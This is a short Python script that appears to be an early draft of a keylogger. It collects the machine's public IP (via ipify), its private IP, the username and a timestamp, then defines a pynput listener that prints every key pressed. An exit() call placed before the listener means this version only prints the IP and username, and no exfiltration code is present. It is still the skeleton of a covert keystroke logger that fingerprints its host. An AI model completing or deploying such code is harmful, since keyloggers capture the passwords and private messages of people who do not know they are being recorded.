from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('/')[2] # home directory splitting by '/' because i use unix system - for windows its "\\"
datetime = time.ctime(time.time())

print(privateIP)
print(user)

exit()

def on_press(key):
    print(key)

"""keyboard listener"""
with Listener(on_press=on_press) as listener:
    listener.join()
